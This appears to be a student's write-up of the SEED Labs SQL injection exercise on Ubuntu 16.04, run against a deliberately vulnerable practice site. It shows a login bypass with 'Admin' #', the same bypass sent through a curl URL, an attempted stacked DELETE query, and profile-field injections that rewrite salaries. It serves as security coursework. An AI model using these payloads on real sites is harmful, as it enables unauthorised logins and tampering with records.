# SQL-INJECTION
<table>
  <thead>
    <tr>
      <th>Title</th>
      <th>Author</th>
      <th>Date</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Seed Lab Ubunto 16.04 SQL Injection Attack</td>
      <td>Xinyi Li</td>
      <td>29-10-2021</td>
    </tr>
  </tbody>
</table>
<h1>Task 1</h1>
<h3>Login MYSQL:</h3>
<p>mysql -u root -pseedubuntu<br>
   mysql> use Users;<br>
   mysql> show tables;<br>
</p>
<h3>Use Such a SQL Query:</h3>
<p>select * from credential where Name = 'Alice';</p>
<p>Screen shoot is in SQL Injection Folder</p>
<h1>Task 2</h1>
<h2>Task 2.1</h2>
<ul>
<li>USERNAME: "Admin' #"</li>
<li>PASSWORD: "***" whatever the password was</li> 
</ul>
<h3>It will result in a SQL Query as:</h3>
<p>SELECT id, name, eid, salary, birth, ssn, address, email,<br>
   nickname, Password<br> 
   FROM credential<br>
   WHERE name= 'Admin' #' and Password='***'
   </p>
<p>Then statement after <code>#</code> will bi regarded as comments. So we can login in as <code> Admin</code>.</p>
<p>Screen shoot is in SQL Injection Folder</p>
<h2>Task 2.2</h2>
<pre>
<code>
curl 'http://www.seedlabsqlinjection.com/unsafe_home.php?username=Admin%27%20%23Password=xyz'
</code>
</pre>
<p>It will return a bunch of <code>html</code>code. When exporting outputs to file by<code> > temp.html</code>and open it</p>
<p>Screen shoot is in SQL Injection Folder</p>
<h2>Task 2.3</h2>
<p>We neeed to delete such a statement to append a row to current database:</p>
<code>DELETE credential where name='ted';
</code><br>
<p>So constructed:</p>
<ul>
<li>USERNAME: <code>" '1=1; DELETE credential where name='ted';#"</code></li>
<li>PASSWORD: <code>" "</code> (Remain Blank)</li> 
</ul>
<p>It fails and alerts with a syntax error:</p>
<p>Screen shoot is in SQL Injection Folder</p>
<p>Because in PHP's <code>mysqli</code> extension, which invokes <code>mysqli::query</code>  API to handle SQL statements, it doesn't support for multiple queries within the same run. Of course, the design of this API attributes to the concern of SQL injection.</p>
<h1>Task 3</h1>
<p>It's hard to find the navigation buttons on this website <br>(<a href="http://www.SeedLabSQLInjection.com" rel="nofollow">www.SeedLabSQLInjection.com</a>).
<p>In order to edit the profile, please log in and then jump to the link address: <br><a href="http://www.seedlabsqlinjection.com/unsafe_edit_frontend.php" rel="nofollow">http://www.seedlabsqlinjection.com/unsafe_edit_frontend.php</a> by Hand.</p>
<h2>Task 3.1</h2>
<p>Log in with Alice's username and password, enter <br> <a href="http://www.seedlabsqlinjection.com/unsafe_edit_frontend.php" rel="nofollow">http://www.seedlabsqlinjection.com/unsafe_edit_frontend.php</a></p>
<p>Modify Phone Number as <code>', Salary=30000</code> and save</p>
<h2>Task 3.2</h2>
<p>Log in with username <code>Boby' #</code>  and arbitrary password, open his profile edit page.</p>
<p>Fill in with:</p>
<p>Phone Number: <code>', Salary=1</code></p>
<p>And keep other properties unchanged. Submit the modification.</p>
<p>Now, you can see:</p>
<p>Screen shoot is in SQL Injection Folder</p>
<p>Log-in as Alice</p>
<p>Assume instead of logging in as Boby using inject method, We keep the login in as Alice, and open Alice's profile edit page.</p>
<p>We should change the Phone Number as</p> 
<pre><code>', Salary=1 where name='Boby' #</code></pre>
